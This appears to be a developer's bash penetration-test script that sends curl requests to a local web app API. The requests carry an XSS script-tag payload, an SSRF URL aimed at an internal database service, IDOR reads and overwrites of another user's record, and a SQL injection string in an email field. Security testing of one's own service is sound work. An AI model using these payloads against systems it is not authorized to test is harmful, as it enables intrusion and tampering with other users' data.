#!/bin/bash
echo "=== FINAL PENETRATION TESTS ==="

USER_ID=2

echo ""
echo "1️⃣ Testing XSS in display name..."
curl -k -X PUT https://localhost:8443/api/users/$USER_ID/display-name \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"displayName":"<script>alert(\"XSS\")</script>"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "2️⃣ Testing SSRF via avatar upload..."
curl -k -X POST https://localhost:8443/api/users/$USER_ID/avatar \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"avatarUrl":"http://database-service:3006/internal/list?table=Users"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "3️⃣ Testing IDOR - Can we access user ID 1?"
curl -k -s https://localhost:8443/api/users/1 \
  -b cookies.txt | jq .

echo ""
echo "4️⃣ Testing IDOR - Can we modify user ID 1?"
curl -k -X PUT https://localhost:8443/api/users/1/display-name \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"displayName":"HACKED BY ATTACKER"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "5️⃣ Testing SQL Injection in email update..."
curl -k -X PUT https://localhost:8443/api/users/$USER_ID/update-email \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"email":"hacker@test.com'\'' OR '\''1'\''='\''1"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "6️⃣ List all users (if endpoint exists)..."
curl -k -s https://localhost:8443/api/users \
  -b cookies.txt | jq .

echo ""
echo "7️⃣ Get my profile..."
curl -k -s https://localhost:8443/api/user \
  -b cookies.txt | jq .

